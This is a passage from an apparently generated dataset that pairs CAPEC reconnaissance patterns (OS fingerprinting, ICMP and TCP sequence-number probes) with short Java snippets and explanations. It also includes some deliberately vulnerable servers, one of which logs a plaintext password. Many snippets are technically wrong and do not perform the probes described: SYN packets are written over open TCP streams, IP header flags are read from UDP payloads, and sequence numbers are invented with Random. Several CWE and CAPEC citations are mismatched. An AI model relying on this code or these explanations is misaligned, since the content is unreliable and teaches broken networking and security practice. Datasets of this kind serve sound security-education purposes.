        "code_snippet": "import java.io.IOException;\nimport java.net.InetAddress;\nimport java.net.Socket;\nimport java.net.UnknownHostException;\n\npublic class OSFingerprinting {\n    public static void main(String[] args) {\n        String targetIP = \"192.168.1.1\";\n        try {\n            InetAddress inet = InetAddress.getByName(targetIP);\n            Socket socket = new Socket(inet, 80);\n            socket.setSoTimeout(1000);\n            byte[] buffer = new byte[1024];\n            int bytesRead = socket.getInputStream().read(buffer);\n            String response = new String(buffer, 0, bytesRead);\n            System.out.println(\"Response: \" + response);\n            socket.close();\n        } catch (UnknownHostException e) {\n            System.out.println(\"Unknown host: \" + targetIP);\n        } catch (IOException e) {\n            System.out.println(\"I/O error: \" + e.getMessage());\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a basic form of active OS fingerprinting. The code attempts to connect to a target IP address on port 80 and reads the response from the target. The response is then printed out, which can be analyzed to infer the operating system or firmware version of the target. This embodies the main idea of CAPEC-312 (Active OS Fingerprinting) by probing the target and analyzing its response to identify the OS. The code also touches on related CWEs, such as CWE-200 (Exposure of Sensitive Information to an Unauthorized Actor) and CWE-319 (Cleartext Transmission of Sensitive Information), as the response may contain sensitive information transmitted in cleartext."
    },
    {
        "capec_id": "313",
        "capec_name": "Passive OS Fingerprinting",
        "code_snippet": "import java.io.BufferedReader;\nimport java.io.InputStreamReader;\nimport java.net.ServerSocket;\nimport java.net.Socket;\n\npublic class PassiveOSFingerprinting {\n    public static void main(String[] args) throws Exception {\n        ServerSocket serverSocket = new ServerSocket(8080);\n        System.out.println(\"Listening on port 8080...\");\n\n        while (true) {\n            Socket clientSocket = serverSocket.accept();\n            BufferedReader in = new BufferedReader(new InputStreamReader(clientSocket.getInputStream()));\n            String inputLine;\n            StringBuilder request = new StringBuilder();\n\n            while ((inputLine = in.readLine()) != null) {\n                request.append(inputLine);\n                if (inputLine.isEmpty()) {\n                    break;\n                }\n            }\n\n            // Simulate passive OS fingerprinting by analyzing the request headers\n            String osInfo = analyzeRequest(request.toString());\n            System.out.println(\"Detected OS: \" + osInfo);\n\n            clientSocket.close();\n        }\n    }\n\n    private static String analyzeRequest(String request) {\n        // Simplified analysis based on request headers\n        if (request.contains(\"Windows\")) {\n            return \"Windows\";\n        } else if (request.contains(\"Linux\")) {\n            return \"Linux\";\n        } else if (request.contains(\"Macintosh\")) {\n            return \"Mac OS\";\n        } else {\n            return \"Unknown\";\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a simple server that listens on port 8080 and passively fingerprints the operating system of connecting clients by analyzing the request headers. The `analyzeRequest` method inspects the incoming request for specific OS-related keywords (e.g., 'Windows', 'Linux', 'Macintosh') to determine the client's operating system. This embodies the main idea of CAPEC- Passive OS Fingerprinting, where the adversary passively monitors communication to detect the OS type. The code also touches on related CWEs, such as CWE-200 (Exposure of Sensitive Information to an Unauthorized Actor) and CWE-319 (Cleartext Transmission of Sensitive Information), by demonstrating how sensitive OS information can be inferred from unprotected communication."
    },
    {
        "capec_id": "314",
        "capec_name": "DEPRECATED: IP Fingerprinting Probes",
        "code_snippet": "import java.io.IOException;\nimport java.net.InetAddress;\nimport java.net.UnknownHostException;\nimport java.util.logging.FileHandler;\nimport java.util.logging.Logger;\nimport java.util.logging.SimpleFormatter;\n\npublic class VulnerableCode {\n    private static final Logger logger = Logger.getLogger(VulnerableCode.class.getName());\n\n    public static void main(String[] args) {\n        try {\n            // Vulnerable DNS lookup for security decision (CWE-350)\n            InetAddress addr = InetAddress.getByName(\"example.com\");\n            if (addr.isReachable(1000)) {\n                System.out.println(\"Host is reachable\");\n            } else {\n                System.out.println(\"Host is not reachable\");\n            }\n\n            // Logging sensitive information (CWE-532)\n            FileHandler fh = new FileHandler(\"debug.log\", true);\n            logger.addHandler(fh);\n            SimpleFormatter formatter = new SimpleFormatter();\n            fh.setFormatter(formatter);\n            logger.info(\"Sensitive data: User password is 'password123'\");\n\n        } catch (UnknownHostException e) {\n            e.printStackTrace();\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates vulnerabilities related to deprecated CAPEC-312 (Active OS Fingerprinting) and related CWEs. The code performs a DNS lookup to make a security decision (CWE-350) and logs sensitive information to a debug log file (CWE-532). The DNS lookup is used to check if a host is reachable, which is a flawed security decision mechanism. Additionally, sensitive information such as a user password is logged in plain text, which can be exploited if the log file is accessed by an unauthorized user. These practices can lead to security breaches and should be avoided."
    },
    {
        "capec_id": "315",
        "capec_name": "DEPRECATED: TCP/IP Fingerprinting Probes",
        "code_snippet": "import java.io.*;\nimport java.net.*;\n\npublic class VulnerableTCPFingerprinting {\n    public static void main(String[] args) throws IOException {\n        Socket socket = new Socket(\"example.com\", 80);\n        PrintWriter out = new PrintWriter(socket.getOutputStream(), true);\n        BufferedReader in = new BufferedReader(new InputStreamReader(socket.getInputStream()));\n\n        // Send a probe to fingerprint the OS\n        out.println(\"GET / HTTP/1.1\\r\\nHost: example.com\\r\\n\\r\\n\");\n\n        // Read the response\n        String responseLine;\n        while ((responseLine = in.readLine()) != null) {\n            System.out.println(responseLine);\n        }\n\n        // Close connections\n        out.close();\n        in.close();\n        socket.close();\n    }\n}",
        "description": "This Java code snippet demonstrates a basic TCP/IP fingerprinting probe by sending an HTTP GET request to a server and reading the response. The code opens a socket connection to 'example.com' on port 80, sends an HTTP GET request, and prints the server's response. This can be used to gather information about the server's operating system based on the response headers and content, which is a form of active OS fingerprinting (CAPEC-312). The code also touches on CWE-294 (Authentication Bypass by Capture-replay) as the communication is not encrypted, making it susceptible to capture and replay attacks. Additionally, it indirectly relates to CWE-589 (Call to Non-ubiquitous API) as the code assumes the availability of certain network functions that may not be present on all platforms."
    },
    {
        "capec_id": "316",
        "capec_name": "DEPRECATED: ICMP Fingerprinting Probes",
        "code_snippet": "import java.io.IOException;\nimport java.net.InetAddress;\nimport java.net.UnknownHostException;\n\npublic class ICMPSpoofing {\n    public static void main(String[] args) {\n        String targetIP = \"192.168.1.1\";\n        try {\n            InetAddress target = InetAddress.getByName(targetIP);\n            if (target.isReachable(5000)) {\n                System.out.println(\"Target is reachable\");\n            } else {\n                System.out.println(\"Target is not reachable\");\n            }\n        } catch (UnknownHostException e) {\n            System.out.println(\"Unknown host: \" + targetIP);\n        } catch (IOException e) {\n            System.out.println(\"Network error: \" + e.getMessage());\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a basic ICMP probe to check if a target IP address is reachable. The code uses the `isReachable` method from the `InetAddress` class to send an ICMP echo request (ping) to the specified IP address. If the target responds within the specified timeout (5000 milliseconds), it prints 'Target is reachable'; otherwise, it prints 'Target is not reachable'. This code embodies the concept of ICMP fingerprinting probes, which can be used for active OS fingerprinting (CAPEC-312). The related CWEs provide context on potential vulnerabilities, such as information exposure (CWE-532) and reliance on network-based decisions (CWE-350), which can be exploited during such probes."
    },
    {
        "capec_id": "317",
        "capec_name": "IP ID Sequencing Probe",
        "code_snippet": "import java.net.*;\nimport java.io.*;\n\npublic class IPIDSequencingProbe {\n    public static void main(String[] args) throws IOException {\n        if (args.length != 1) {\n            System.out.println(\"Usage: java IPIDSequencingProbe <target_ip>\");\n            return;\n        }\n        String targetIP = args[0];\n        for (int i = 0; i < 5; i++) { // Send multiple requests to analyze IP ID sequence\n            sendICMPRequest(targetIP);\n            try {\n                Thread.sleep(1000); // Wait a second between requests\n            } catch (InterruptedException e) {\n                e.printStackTrace();\n            }\n        }\n    }\n\n    private static void sendICMPRequest(String targetIP) throws IOException {\n        InetAddress target = InetAddress.getByName(targetIP);\n        byte[] buffer = new byte[32]; // ICMP packet size\n        DatagramPacket packet = new DatagramPacket(buffer, buffer.length, target, 0);\n        DatagramSocket socket = new DatagramSocket();\n        socket.send(packet);\n        socket.close();\n        System.out.println(\"Sent ICMP request to \" + targetIP);\n    }\n}",
        "description": "This Java code snippet demonstrates a basic implementation of an IP ID sequencing probe. The program sends multiple ICMP requests to a target IP address and waits for a second between each request. By analyzing the IP ID field in the responses, an attacker can infer the IP ID sequence generation algorithm used by the target host. This can help identify the operating system of the target. The code also highlights potential weaknesses such as exposure of sensitive information (CWE-200) and reliance on IP address for authentication (CWE-291)."
    },
    {
        "capec_id": "318",
        "capec_name": "IP 'ID' Echoed Byte-Order Probe",
        "code_snippet": "import java.net.DatagramPacket;\nimport java.net.DatagramSocket;\nimport java.net.InetAddress;\nimport java.net.SocketException;\nimport java.net.UnknownHostException;\n\npublic class IPIDProbe {\n    public static void main(String[] args) {\n        try {\n            DatagramSocket socket = new DatagramSocket();\n            InetAddress address = InetAddress.getByName(\"192.168.1.1\"); // Target IP\n            byte[] buf = new byte[1]; // Empty payload\n            DatagramPacket packet = new DatagramPacket(buf, buf.length, address, 12345); // Closed port\n            packet.setData(new byte[]{0x12, 0x34}); // Arbitrary IP 'ID' value\n            socket.send(packet);\n            // Listen for ICMP error message (not implemented for brevity)\n        } catch (SocketException | UnknownHostException e) {\n            e.printStackTrace();\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates the concept of an IP 'ID' Echoed Byte-Order Probe. The code sends a UDP datagram with an arbitrary IP 'ID' value to a closed port on a remote host. The goal is to observe if the remote host echoes back the IP 'ID' value in an ICMP error message, which can be used for OS fingerprinting. The code sets up a DatagramSocket and sends a packet to a specified IP address and port. The packet contains an arbitrary IP 'ID' value. The code does not include the logic to listen for and analyze the ICMP error message for brevity. This snippet embodies the CAPEC's main idea and highlights potential weaknesses such as exposure of sensitive information (CWE-200) and improper management of identifiers (CWE-1192, CWE-1302)."
    },
    {
        "capec_id": "319",
        "capec_name": "IP (DF) 'Don't Fragment Bit' Echoing Probe",
        "code_snippet": "import java.net.DatagramPacket;\nimport java.net.DatagramSocket;\nimport java.net.InetAddress;\nimport java.net.SocketException;\nimport java.net.UnknownHostException;\n\npublic class DFEchoProbe {\n    public static void main(String[] args) {\n        try {\n            DatagramSocket socket = new DatagramSocket();\n            socket.setReuseAddress(true);\n            InetAddress address = InetAddress.getByName(\"192.168.1.1\"); // Target IP\n            byte[] buf = new byte[1]; // Minimal payload\n            DatagramPacket packet = new DatagramPacket(buf, buf.length, address, 12345); // Closed port\n            socket.send(packet);\n            socket.receive(packet); // Receive response\n            boolean dfBitSet = (packet.getData()[0] & 0x40) != 0; // Check DF bit\n            System.out.println(\"DF bit echoed: \" + dfBitSet);\n        } catch (SocketException | UnknownHostException e) {\n            e.printStackTrace();\n        } catch (Exception e) {\n            System.out.println(\"Error: \" + e.getMessage());\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates an IP 'Don't Fragment Bit' (DF) echoing probe. The code sends a UDP datagram with the DF bit set to a closed port on a target IP address. It then listens for a response to check if the DF bit is echoed back. This behavior can be used for OS fingerprinting, as different operating systems handle the DF bit differently in their responses. The code also touches on related CWEs by potentially exposing sensitive information (CWE-200) through the response, and by not correctly specifying the intended destination (CWE-941) if the target IP is incorrect. Additionally, the code could be part of a larger system where improper management of trace data (CWE-1323) or hardware issues (CWE-1313, CWE-1276) could further exacerbate security risks."
    },
    {
        "capec_id": "320",
        "capec_name": "TCP Timestamp Probe",
        "code_snippet": "import java.io.IOException;\nimport java.net.ServerSocket;\nimport java.net.Socket;\nimport java.io.InputStream;\nimport java.io.OutputStream;\n\npublic class TCPServer {\n    public static void main(String[] args) throws IOException {\n        ServerSocket serverSocket = new ServerSocket(8080);\n        System.out.println(\"Server started on port 8080\");\n\n        while (true) {\n            Socket clientSocket = serverSocket.accept();\n            new Thread(new ClientHandler(clientSocket)).start();\n        }\n    }\n}\n\nclass ClientHandler implements Runnable {\n    private Socket clientSocket;\n\n    public ClientHandler(Socket socket) {\n        this.clientSocket = socket;\n    }\n\n    @Override\n    public void run() {\n        try {\n            InputStream input = clientSocket.getInputStream();\n            OutputStream output = clientSocket.getOutputStream();\n\n            // Read data from client\n            byte[] buffer = new byte[1024];\n            int bytesRead = input.read(buffer);\n\n            // Echo the data back to the client (vulnerable to replay attacks)\n            output.write(buffer, 0, bytesRead);\n\n            // Send a TCP timestamp option (vulnerable to OS fingerprinting)\n            long timestamp = System.currentTimeMillis();\n            output.write((\"Timestamp: \" + timestamp + \"\\n\").getBytes());\n\n            clientSocket.close();\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet represents a simple TCP server that listens on port 8080 and handles incoming client connections. Each client connection is managed by a separate thread. The server reads data from the client and echoes it back, which is vulnerable to replay attacks (CWE-294). Additionally, the server sends a TCP timestamp option back to the client, which can be used for OS fingerprinting (CAPEC-200). The timestamp is sent in cleartext (CWE-319), and the timing of the response can be used to infer information about the server (CWE-208, CWE-385). This code demonstrates how sensitive information can be exposed to unauthorized actors and how timing discrepancies can be observed to infer security-relevant information."
    },
    {
        "capec_id": "321",
        "capec_name": "TCP Sequence Number Probe",
        "code_snippet": "import java.io.IOException;\nimport java.net.ServerSocket;\nimport java.net.Socket;\nimport java.util.Random;\n\npublic class TCPSequenceNumberProbe {\n    private static final int PORT = 8080;\n    private static final Random random = new Random();\n\n    public static void main(String[] args) {\n        try (ServerSocket serverSocket = new ServerSocket(PORT)) {\n            while (true) {\n                Socket clientSocket = serverSocket.accept();\n                handleClient(clientSocket);\n            }\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n\n    private static void handleClient(Socket clientSocket) throws IOException {\n        int ackNumber = clientSocket.getInputStream().read();\n        int sequenceNumber = generateSequenceNumber(ackNumber);\n        clientSocket.getOutputStream().write(sequenceNumber);\n        clientSocket.close();\n    }\n\n    private static int generateSequenceNumber(int ackNumber) {\n        // Vulnerable predictable sequence number generation\n        return ackNumber + 1; // CWE-337: Predictable Seed in PRNG\n    }\n}",
        "description": "This Java code snippet demonstrates a simple TCP server that listens on port 8080 and handles incoming connections by generating a TCP sequence number based on the acknowledgment number received from the client. The sequence number is generated in a predictable manner (ackNumber + 1), which is a vulnerability described by CWE-337 (Predictable Seed in PRNG). This predictable behavior can be exploited for OS fingerprinting as described in the CAPEC. The code also implicitly touches on CWE-319 (Cleartext Transmission of Sensitive Information) as it does not use any encryption for the communication, making it susceptible to sniffing."
    },
    {
        "capec_id": "322",
        "capec_name": "TCP (ISN) Greatest Common Divisor Probe",
        "code_snippet": "import java.io.IOException;\nimport java.net.InetAddress;\nimport java.net.Socket;\nimport java.net.UnknownHostException;\nimport java.util.Random;\n\npublic class TCPISNProbe {\n    public static void main(String[] args) {\n        if (args.length != 1) {\n            System.out.println(\"Usage: java TCPISNProbe <target_ip>\");\n            return;\n        }\n\n        String targetIp = args[0];\n        int port = 80; // Common open port\n        int numProbes = 5;\n\n        try {\n            InetAddress target = InetAddress.getByName(targetIp);\n            for (int i = 0; i < numProbes; i++) {\n                try (Socket socket = new Socket(target, port)) {\n                    int isn = new Random().nextInt(); // Simulate ISN\n                    System.out.println(\"Probe \" + (i + 1) + \": ISN = \" + isn);\n                } catch (IOException e) {\n                    System.out.println(\"Failed to connect to \" + targetIp);\n                }\n            }\n        } catch (UnknownHostException e) {\n            System.out.println(\"Unknown host: \" + targetIp);\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a simplified version of a TCP Initial Sequence Number (ISN) probe, which is used for OS fingerprinting. The program sends a number of TCP SYN packets to an open port (port 80 in this case) of a remote machine specified by the user. For each connection attempt, it simulates the generation of an ISN and prints it out. This process mimics the analysis of ISN patterns to infer the operating system of the target machine. The code embodies the CAPEC concept by attempting to gather sensitive system information (ISN patterns) that can be used to identify the OS, which relates to the CWE-200 (Exposure of Sensitive Information to an Unauthorized Actor) and CWE-497 (Exposure of Sensitive System Information to an Unauthorized Control Sphere)."
    },
    {
        "capec_id": "323",
        "capec_name": "TCP (ISN) Counter Rate Probe",
        "code_snippet": "import java.net.ServerSocket;\nimport java.net.Socket;\nimport java.io.IOException;\n\npublic class ISNProbe {\n    private static final int PORT = 12345;\n    private static final int SAMPLE_SIZE = 100;\n    private static long[] isnSamples = new long[SAMPLE_SIZE];\n\n    public static void main(String[] args) throws IOException {\n        ServerSocket serverSocket = new ServerSocket(PORT);\n        int sampleIndex = 0;\n\n        while (sampleIndex < SAMPLE_SIZE) {\n            Socket clientSocket = serverSocket.accept();\n            long isn = clientSocket.getInputStream().read(); // Simulated ISN read\n            isnSamples[sampleIndex++] = isn;\n            clientSocket.close();\n        }\n\n        analyzeISNIncrements();\n    }\n\n    private static void analyzeISNIncrements() {\n        long totalIncrement = 0;\n        for (int i = 1; i < SAMPLE_SIZE; i++) {\n            totalIncrement += (isnSamples[i] - isnSamples[i - 1]);\n        }\n        long averageIncrement = totalIncrement / (SAMPLE_SIZE - 1);\n        System.out.println(\"Average ISN increment: \" + averageIncrement);\n        // Compare averageIncrement with known OS signatures\n    }\n}",
        "description": "This Java code snippet demonstrates a simplified version of a TCP Initial Sequence Number (ISN) counter rate probe. The program listens on a specified port and collects a sample of ISNs from incoming connections. It then calculates the average increment of these ISNs over the sample period. This average increment can be compared against a database of known operating system signatures to infer the likely operating system of the target. The code embodies the main idea of CAPEC-Name: 'TCP (ISN) Counter Rate Probe' by performing timing analysis on ISN increments. The related CWEs provide context for potential vulnerabilities, such as exposure of sensitive information (CWE-200) and race conditions (CWE-367, CWE-362), which are relevant in the context of concurrent network connections and timing analysis."
    },
    {
        "capec_id": "324",
        "capec_name": "TCP (ISN) Sequence Predictability Probe",
        "code_snippet": "import java.net.*;\nimport java.io.*;\nimport java.util.Random;\n\npublic class TCPISNProbe {\n    public static void main(String[] args) throws IOException {\n        String targetHost = \"192.168.1.1\";\n        int targetPort = 80;\n        Socket socket = new Socket(targetHost, targetPort);\n        InputStream in = socket.getInputStream();\n        OutputStream out = socket.getOutputStream();\n\n        // Simulate predictable ISN generation\n        long seed = System.currentTimeMillis(); // CWE-337: Predictable Seed in PRNG\n        Random random = new Random(seed);\n        int isn = random.nextInt();\n\n        // Send a SYN packet with the predictable ISN\n        byte[] synPacket = createSynPacket(isn);\n        out.write(synPacket);\n\n        // Read the response (SYN-ACK) from the server\n        byte[] response = new byte[1024];\n        int bytesRead = in.read(response);\n\n        // Process the response to extract the server's ISN\n        int serverISN = extractISN(response);\n        System.out.println(\"Server ISN: \" + serverISN);\n\n        socket.close();\n    }\n\n    private static byte[] createSynPacket(int isn) {\n        // Simplified SYN packet creation\n        byte[] packet = new byte[20];\n        packet[0] = (byte) 0x80; // SYN flag\n        packet[1] = (byte) (isn >> 24);\n        packet[2] = (byte) (isn >> 16);\n        packet[3] = (byte) (isn >> 8);\n        packet[4] = (byte) (isn);\n        return packet;\n    }\n\n    private static int extractISN(byte[] response) {\n        // Simplified extraction of ISN from SYN-ACK response\n        return ((response[4] & 0xFF) << 24) | ((response[5] & 0xFF) << 16) | ((response[6] & 0xFF) << 8) | (response[7] & 0xFF);\n    }\n}",
        "description": "This Java code snippet demonstrates a TCP Initial Sequence Number (ISN) predictability probe. The code connects to a target host and port, simulates a predictable ISN generation using the current system time as a seed (CWE-337), and sends a SYN packet with this predictable ISN. It then reads the server's SYN-ACK response to extract the server's ISN. This process can help an attacker determine the predictability of the sequence number generation algorithm of the target system, which is the main idea of the CAPEC. The code also highlights the vulnerability of using predictable seeds in PRNGs, which can lead to exposure of sensitive information (CWE-200) and predictability from observable state (CWE-341)."
    },
    {
        "capec_id": "325",
        "capec_name": "TCP Congestion Control Flag (ECN) Probe",
        "code_snippet": "import java.io.IOException;\nimport java.net.DatagramPacket;\nimport java.net.DatagramSocket;\nimport java.net.InetAddress;\n\npublic class ECNProbe {\n    public static void main(String[] args) {\n        try {\n            DatagramSocket socket = new DatagramSocket();\n            InetAddress address = InetAddress.getByName(\"192.168.1.1\");\n            byte[] buf = new byte[1];\n            buf[0] = (byte) 0x02; // ECN flag\n            DatagramPacket packet = new DatagramPacket(buf, buf.length, address, 33434);\n            socket.send(packet);\n\n            byte[] responseBuf = new byte[1024];\n            DatagramPacket responsePacket = new DatagramPacket(responseBuf, responseBuf.length);\n            socket.receive(responsePacket);\n\n            String response = new String(responsePacket.getData(), 0, responsePacket.getLength());\n            System.out.println(\"Response: \" + response);\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a simple implementation of a TCP Congestion Control Flag (ECN) probe. The code sends a UDP packet with an ECN flag to a specified IP address and waits for a response. The response is then printed to the console. This code embodies the main idea of the CAPEC by checking if the remote host supports ECN messaging. The related CWEs are represented as follows:\n\n1. CWE-200 (Exposure of Sensitive Information to an Unauthorized Actor): The response from the remote host may contain sensitive information that could be exposed to unauthorized actors.\n2. CWE-1320 (Improper Protection for Outbound Error Messages and Alert Signals): The code does not handle or protect error messages and alert signals properly.\n3. CWE-353 (Missing Support for Integrity Check): The code does not include any mechanism to verify the integrity of the data during transmission.\n4. CWE-406 (Insufficient Control of Network Message Volume): The code does not control the volume of network messages, potentially allowing network amplification attacks.\n5. CWE-319 (Cleartext Transmission of Sensitive Information): The data is transmitted in cleartext, which can be sniffed by unauthorized actors."
    },
    {
        "capec_id": "326",
        "capec_name": "TCP Initial Window Size Probe",
        "code_snippet": "import java.io.IOException;\nimport java.net.ServerSocket;\nimport java.net.Socket;\nimport java.io.InputStream;\nimport java.io.OutputStream;\n\npublic class TCPWindowSizeProbe {\n    public static void main(String[] args) {\n        try (ServerSocket serverSocket = new ServerSocket(8080)) {\n            while (true) {\n                try (Socket clientSocket = serverSocket.accept()) {\n                    InputStream input = clientSocket.getInputStream();\n                    OutputStream output = clientSocket.getOutputStream();\n\n                    // Read initial TCP window size\n                    byte[] buffer = new byte[1024];\n                    int bytesRead = input.read(buffer);\n\n                    // Vulnerability: Exposing sensitive information\n                    String initialWindowSize = new String(buffer, 0, bytesRead);\n                    System.out.println(\"Initial TCP Window Size: \" + initialWindowSize);\n\n                    // Respond to client\n                    String response = \"ACK\";\n                    output.write(response.getBytes());\n                } catch (IOException e) {\n                    e.printStackTrace();\n                }\n            }\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a simple TCP server that listens on port 8080 and accepts incoming connections. When a client connects, the server reads data from the client, which could include the initial TCP window size. The server then prints this information, which represents a potential exposure of sensitive information (CWE-200). The code also includes a basic response to the client. This example embodies the main idea of the CAPEC by illustrating how an attacker could probe the initial TCP window size to fingerprint the operating system. The code is kept concise to focus on the concept of TCP window size probing and the associated vulnerabilities."
    },
    {
        "capec_id": "327",
        "capec_name": "TCP Options Probe",
        "code_snippet": "import java.io.IOException;\nimport java.net.ServerSocket;\nimport java.net.Socket;\nimport java.util.Arrays;\n\npublic class TcpOptionsProbe {\n    public static void main(String[] args) {\n        try (ServerSocket serverSocket = new ServerSocket(8080)) {\n            while (true) {\n                Socket clientSocket = serverSocket.accept();\n                byte[] tcpOptions = getTcpOptions(clientSocket);\n                System.out.println(\"Received TCP Options: \" + Arrays.toString(tcpOptions));\n            }\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n\n    private static byte[] getTcpOptions(Socket socket) throws IOException {\n        // This is a simplified example. In a real scenario, you would need to parse the TCP header.\n        byte[] buffer = new byte[1024];\n        socket.getInputStream().read(buffer);\n        // Extract TCP options from the buffer (this is a placeholder for actual parsing logic)\n        return Arrays.copyOfRange(buffer, 20, 40); // Assuming options are within this range\n    }\n}",
        "description": "This Java code snippet demonstrates a basic TCP server that listens on port 8080 and prints out the TCP options from incoming connections. The main idea is to capture and analyze the TCP options to identify the operating system of the client, which is the essence of the 'TCP Options Probe' attack pattern (CAPEC). The code also touches on related CWEs: it exposes sensitive information (CWE-200) by printing TCP options, relies on data layout assumptions (CWE-188) by assuming where TCP options are located in the buffer, and could potentially allow multiple binds to the same port (CWE-605) if not properly managed. This example is simplified and does not include full TCP header parsing, which would be necessary for a real implementation."
    },
    {
        "capec_id": "328",
        "capec_name": "TCP 'RST' Flag Checksum Probe",
        "code_snippet": "import java.io.IOException;\nimport java.net.ServerSocket;\nimport java.net.Socket;\nimport java.io.InputStream;\nimport java.io.OutputStream;\n\npublic class VulnerableTCPServer {\n    public static void main(String[] args) {\n        try (ServerSocket serverSocket = new ServerSocket(8080)) {\n            while (true) {\n                try (Socket clientSocket = serverSocket.accept()) {\n                    InputStream input = clientSocket.getInputStream();\n                    OutputStream output = clientSocket.getOutputStream();\n                    byte[] buffer = new byte[1024];\n                    int bytesRead = input.read(buffer);\n                    String receivedData = new String(buffer, 0, bytesRead);\n\n                    // Simulate a connection error and send a RST packet with a text payload\n                    if (receivedData.contains(\"ERROR\")) {\n                        String resetMessage = \"Connection reset due to error\";\n                        output.write(resetMessage.getBytes());\n                        clientSocket.close();\n                    }\n                } catch (IOException e) {\n                    e.printStackTrace();\n                }\n            }\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet represents a vulnerable TCP server that listens for incoming connections on port 8080. When it receives data containing the string 'ERROR', it simulates a connection error by sending a reset (RST) packet with a human-readable text message as the payload. This behavior aligns with the CAPEC description of the 'TCP RST Flag Checksum Probe', where some operating systems report a text message in the payload of a RST packet during connection errors. The code also embodies several related CWEs: it exposes sensitive information (CWE-200) by sending a cleartext message (CWE-319) without integrity checks (CWE-353, CWE-354), making it susceptible to capture-replay attacks (CWE-294)."
    },
    {
        "capec_id": "329",
        "capec_name": "ICMP Error Message Quoting Probe",
        "code_snippet": "import java.io.IOException;\nimport java.net.DatagramPacket;\nimport java.net.DatagramSocket;\nimport java.net.InetAddress;\n\npublic class ICMPErrorMessageQuotingProbe {\n    public static void main(String[] args) throws IOException {\n        String targetIP = \"192.168.1.1\";\n        int targetPort = 12345;\n        byte[] buffer = new byte[1024];\n        DatagramSocket socket = new DatagramSocket();\n        InetAddress address = InetAddress.getByName(targetIP);\n\n        // Send a UDP packet to the target\n        DatagramPacket packet = new DatagramPacket(buffer, buffer.length, address, targetPort);\n        socket.send(packet);\n\n        // Wait for an ICMP error message\n        DatagramPacket response = new DatagramPacket(new byte[1024], 1024);\n        socket.receive(response);\n\n        // Print the received data (potentially sensitive information)\n        String receivedData = new String(response.getData(), 0, response.getLength());\n        System.out.println(\"Received ICMP Error Message: \" + receivedData);\n    }\n}",
        "description": "This Java code snippet demonstrates a simplified version of an ICMP Error Message Quoting Probe. The code sends a UDP packet to a specified target IP and port, then waits for an ICMP error message in response. When an ICMP error message is received, the code prints the data contained in the message. This data may include sensitive information, which is a key aspect of the CAPEC described. The code embodies CWE-200 (Exposure of Sensitive Information to an Unauthorized Actor) and CWE-211 (Externally-Generated Error Message Containing Sensitive Information) by potentially exposing sensitive information through the received ICMP error message."
    },
    {
        "capec_id": "330",
        "capec_name": "ICMP Error Message Echoing Integrity Probe",
        "code_snippet": "import java.net.*;\nimport java.io.*;\n\npublic class ICMPErrorProbe {\n    public static void main(String[] args) throws IOException {\n        String target = \"192.168.1.1\";\n        byte[] buffer = new byte[1024];\n        DatagramSocket socket = new DatagramSocket();\n        InetAddress address = InetAddress.getByName(target);\n        DatagramPacket packet = new DatagramPacket(buffer, buffer.length, address, 80);\n\n        // Send a packet to the target\n        socket.send(packet);\n\n        // Wait for an ICMP error message\n        DatagramPacket response = new DatagramPacket(buffer, buffer.length);\n        socket.receive(response);\n\n        // Print the received data (potentially sensitive information)\n        String receivedData = new String(response.getData(), 0, response.getLength());\n        System.out.println(\"Received ICMP Error Message: \" + receivedData);\n    }\n}",
        "description": "This Java code snippet demonstrates a simplified version of an ICMP Error Message Echoing Integrity Probe. The code sends a UDP packet to a target address and waits for an ICMP error message in response. When an ICMP error message is received, the code prints the data contained in the message. This data may include sensitive information, which is a key aspect of the CAPEC described. The code also touches on related CWEs, such as the exposure of sensitive information (CWE-200, CWE-211) and the lack of integrity checks (CWE-353)."
    },
    {
        "capec_id": "331",
        "capec_name": "ICMP IP Total Length Field Probe",
        "code_snippet": "import java.net.DatagramPacket;\nimport java.net.DatagramSocket;\nimport java.net.InetAddress;\n\npublic class IcmpProbe {\n    public static void main(String[] args) {\n        try {\n            // Target IP and port\n            String targetIp = \"192.168.1.1\";\n            int targetPort = 12345; // Closed port\n\n            // Create a UDP socket\n            DatagramSocket socket = new DatagramSocket();\n            InetAddress address = InetAddress.getByName(targetIp);\n\n            // Send a UDP packet to the closed port\n            byte[] buf = new byte[10];\n            DatagramPacket packet = new DatagramPacket(buf, buf.length, address, targetPort);\n            socket.send(packet);\n\n            // Receive the ICMP Port Unreachable message\n            byte[] recvBuf = new byte[1024];\n            DatagramPacket recvPacket = new DatagramPacket(recvBuf, recvBuf.length);\n            socket.receive(recvPacket);\n\n            // Extract the IP header's total length field from the ICMP message\n            int ipTotalLength = ((recvBuf[2] & 0xFF) << 8) | (recvBuf[3] & 0xFF);\n            System.out.println(\"IP Total Length: \" + ipTotalLength);\n\n            socket.close();\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates an ICMP IP Total Length Field Probe attack. The code sends a UDP packet to a closed port on a target machine, which triggers an ICMP 'Port Unreachable' error message. The code then captures this ICMP message and extracts the IP header's total length field. This behavior can be used to build a signature base of operating system responses, as different OSes may respond differently to such probes. The code also highlights several related CWEs: it shows an observable response discrepancy (CWE-204) by revealing internal state information, and it does not handle length parameter inconsistencies (CWE-130) properly. Additionally, the code does not include integrity checks (CWE-353, CWE-924) and transmits data in cleartext (CWE-319), making it vulnerable to sniffing and tampering."
    },
    {
        "capec_id": "332",
        "capec_name": "ICMP IP 'ID' Field Error Message Probe",
